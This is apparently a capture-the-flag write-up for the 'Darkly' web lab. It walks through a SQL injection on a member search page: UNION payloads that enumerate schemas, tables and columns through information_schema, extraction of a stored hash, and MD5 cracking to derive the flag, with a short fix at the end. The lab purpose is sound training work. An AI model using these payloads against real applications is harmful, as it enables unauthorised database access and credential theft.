# SQL Injection (member)

## Vulnerability

At the top of the page, there is a `members` link to: [`index.php?page=member`](http://darkly/index.php?page=member).

The page contains an input and a button.
Giving an empty input and clicking on submit gave us the following error:
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
```

That means that an SQL Injection is possible.
It also tells us that we have a MariaDB (which might guide us as to [which syntax is possible](https://book.hacktricks.xyz/pentesting-web/sql-injection#identifying-back-end)).
We can verify it by doing a simple query: [[run]](<http://darkly/index.php?page=member&id=1+OR+true&Submit=Submit#>)
```sql
1 OR true
```

Give the result:
```
ID: 1 OR true 
First name: one
Surname : me

ID: 1 OR true 
First name: two
Surname : me

ID: 1 OR true 
First name: three
Surname : me

ID: 1 OR true 
First name: Flag
Surname : GetThe
```

Since we can't blindly explore the database, we have to extract some metadata first.

The first one is the table name using the following query: [[run]](<http://darkly/index.php?page=member&id=1+UNION(SELECT+%60SCHEMA_NAME%60,+1+FROM+%60information_schema%60.%60SCHEMATA%60);&Submit=Submit#:~:text=Member_Sql_Injection>)
```sql
1 UNION(SELECT `SCHEMA_NAME`, 1 FROM `information_schema`.`SCHEMATA`);
```

We can now see the tables name:
- `information_schema`
- `Member_Brute_Force`
- `Member_Sql_Injection`
- `Member_guestbook`
- `Member_images`
- `Member_survey`

Since the challenge seems to be an SQL Injection, let's take `Member_Sql_Injection`.

Now we need to extract the tables name: [[run]](<http://darkly/index.php?page=member&id=1+UNION(SELECT+%60TABLE_NAME%60,+%60TABLE_SCHEMA%60+FROM+%60information_schema%60.%60TABLES%60);&Submit=Submit#:~:text=TABLES%60)%3B%20%0AFirst%20name%3A-,users,-Surname%20%3A%20Member_Sql_Injection>)
```sql
1 UNION(SELECT `TABLE_NAME`, `TABLE_SCHEMA` FROM `information_schema`.`TABLES`);
```

By filtering in the data, we can see that there is only one table: `users`.

Now we need to extract the columns name: [[run]](<http://darkly/index.php?page=member&id=1+UNION%28SELECT+%60TABLE_NAME%60%2C+%60COLUMN_NAME%60+FROM+%60information_schema%60.%60COLUMNS%60%29%3B&Submit=Submit#:~:text=name%3A%20users%0ASurname%20%3A-,user_id,-ID%3A%201%20UNION>)
```sql
1 UNION(SELECT `TABLE_NAME`, `COLUMN_NAME` FROM `information_schema`.`COLUMNS`);
```

By filtering in the data, we now know the column names:
- `user_id`
- `first_name`
- `last_name`
- `town`
- `country`
- `planet`
- `Commentaire`
- `countersign`

Only the last two contains interesting informations.

By querying them, we know what to do next: [[run]](<http://darkly/index.php?page=member&id=1+UNION(SELECT+%60Commentaire%60,+%60countersign%60+FROM+%60users%60);&Submit=Submit#:~:text=5ff9d0165b4f92b14994e5c685cdce28>)
```sql
1 UNION(SELECT `Commentaire`, `countersign` FROM `users`);
```
```
Decrypt this password -> then lower all the char. Sh256 on it and it's good !
5ff9d0165b4f92b14994e5c685cdce28
```

Using a universal hash decryptor likes [hashes.com](https://hashes.com/en/decrypt/hash), the MD5 match has been found:
```
5ff9d0165b4f92b14994e5c685cdce28:FortyTwo:MD5
```

So, the flag is:
```
sha256(lower('FortyTwo'))
```

## Possible Fix

- Use prepared statements.
